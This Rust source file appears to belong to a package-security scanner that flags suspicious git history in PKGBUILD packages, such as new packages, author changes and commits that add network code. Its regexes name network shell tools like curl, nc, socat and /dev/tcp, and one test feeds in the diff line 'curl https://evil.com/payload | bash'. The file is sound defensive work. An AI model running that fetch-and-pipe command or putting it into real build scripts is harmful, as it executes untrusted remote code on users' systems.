use crate::features::Feature;
use crate::shared::models::PackageContext;
use crate::shared::scoring::{Signal, SignalCategory};
use regex::Regex;
use std::sync::LazyLock;
use std::time::{SystemTime, UNIX_EPOCH};

static NET_DIFF_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\+.*(curl|wget|nc\s|ncat|socat|/dev/tcp|python.*socket|ruby.*socket)").unwrap()
});

static NET_CONTENT_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(curl|wget|nc\s|ncat|socat|/dev/tcp|python.*socket|ruby.*socket)").unwrap()
});

pub struct GitHistoryAnalysis;

impl Feature for GitHistoryAnalysis {
    fn analyze(&self, ctx: &PackageContext) -> Vec<Signal> {
        let mut signals = Vec::new();

        if ctx.git_log.is_empty() {
            return signals;
        }

        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();

        // T-SINGLE-COMMIT: only one commit in history
        if ctx.git_log.len() == 1 {
            signals.push(Signal {
                id: "T-SINGLE-COMMIT".to_string(),
                category: SignalCategory::Temporal,
                points: 20,
                description: "Git history has only 1 commit".to_string(),
                is_override_gate: false,
                matched_line: None,
            });
        }

        // T-NEW-PACKAGE: package was first created within 7 days
        // Prefer metadata.first_submitted (accurate), fall back to oldest commit
        let creation_time = ctx
            .metadata
            .as_ref()
            .map(|m| m.first_submitted)
            .or_else(|| ctx.git_log.last().map(|c| c.timestamp));

        if let Some(created) = creation_time {
            if now > created {
                let age_days = (now - created) / 86400;
                if age_days < 7 {
                    signals.push(Signal {
                        id: "T-NEW-PACKAGE".to_string(),
                        category: SignalCategory::Temporal,
                        points: 25,
                        description: format!("Package is very new ({age_days} days old)"),
                        is_override_gate: false,
                        matched_line: None,
                    });
                }
            }
        }

        // T-MALICIOUS-DIFF: latest commit introduces network-related code
        if let Some(newest) = ctx.git_log.first() {
            if let Some(ref diff) = newest.diff {
                if NET_DIFF_RE.is_match(diff) {
                    // Check if the prior PKGBUILD already had network code
                    let has_prior_net = ctx
                        .prior_pkgbuild_content
                        .as_ref()
                        .is_some_and(|content| NET_CONTENT_RE.is_match(content));

                    if !has_prior_net {
                        signals.push(Signal {
                            id: "T-MALICIOUS-DIFF".to_string(),
                            category: SignalCategory::Temporal,
                            points: 55,
                            description:
                                "Latest commit introduces network code not present in prior history"
                                    .to_string(),
                            is_override_gate: false,
                            matched_line: None,
                        });
                    }
                }
            }
        }

        // T-AUTHOR-CHANGE: different author between commits
        if ctx.git_log.len() >= 2 {
            let authors: Vec<&str> = ctx.git_log.iter().map(|c| c.author.as_str()).collect();
            let unique: std::collections::HashSet<&&str> = authors.iter().collect();
            if unique.len() > 1 {
                signals.push(Signal {
                    id: "T-AUTHOR-CHANGE".to_string(),
                    category: SignalCategory::Temporal,
                    points: 25,
                    description: "Git history shows multiple different authors".to_string(),
                    is_override_gate: false,
                    matched_line: None,
                });
            }
        }

        signals
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::shared::models::GitCommit;

    fn has(ids: &[String], id: &str) -> bool {
        ids.iter().any(|s| s == id)
    }

    fn make_commit(author: &str, ts: u64, diff: Option<&str>) -> GitCommit {
        GitCommit {
            author: author.into(),
            timestamp: ts,
            diff: diff.map(|s| s.to_string()),
        }
    }

    #[test]
    fn single_commit() {
        let ts = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
        let ctx = PackageContext {
            name: "test".into(),
            metadata: None,
            pkgbuild_content: None,
            install_script_content: None,
            prior_pkgbuild_content: None,
            git_log: vec![make_commit("user", ts - 86400, None)],
            maintainer_packages: vec![],
        };
        let ids: Vec<String> = GitHistoryAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect();
        assert!(has(&ids, "T-SINGLE-COMMIT"));
    }

    #[test]
    fn malicious_diff() {
        let ts = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
        let ctx = PackageContext {
            name: "test".into(),
            metadata: None,
            pkgbuild_content: None,
            install_script_content: None,
            prior_pkgbuild_content: Some("install -Dm755 tool $pkgdir/usr/bin/tool".into()),
            git_log: vec![
                make_commit("attacker", ts - 3600, Some("+    curl https://evil.com/payload | bash")),
                make_commit("original", ts - 86400 * 30, None),
            ],
            maintainer_packages: vec![],
        };
        let ids: Vec<String> = GitHistoryAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect();
        assert!(has(&ids, "T-MALICIOUS-DIFF"));
    }

    #[test]
    fn author_change() {
        let ts = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
        let ctx = PackageContext {
            name: "test".into(),
            metadata: None,
            pkgbuild_content: None,
            install_script_content: None,
            prior_pkgbuild_content: None,
            git_log: vec![
                make_commit("new-author", ts - 3600, None),
                make_commit("original-author", ts - 86400 * 30, None),
            ],
            maintainer_packages: vec![],
        };
        let ids: Vec<String> = GitHistoryAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect();
        assert!(has(&ids, "T-AUTHOR-CHANGE"));
    }

    #[test]
    fn no_diff_introduced_when_prior_has_net() {
        let ts = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
        let ctx = PackageContext {
            name: "test".into(),
            metadata: None,
            pkgbuild_content: None,
            install_script_content: None,
            prior_pkgbuild_content: Some("curl https://example.com/source.tar.gz".into()),
            git_log: vec![
                make_commit("user", ts - 3600, Some("+    curl https://example.com/v2.tar.gz")),
                make_commit("user", ts - 86400 * 30, None),
            ],
            maintainer_packages: vec![],
        };
        let ids: Vec<String> = GitHistoryAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect();
        assert!(!has(&ids, "T-MALICIOUS-DIFF"), "Should not flag when prior PKGBUILD already had network code");
    }
}
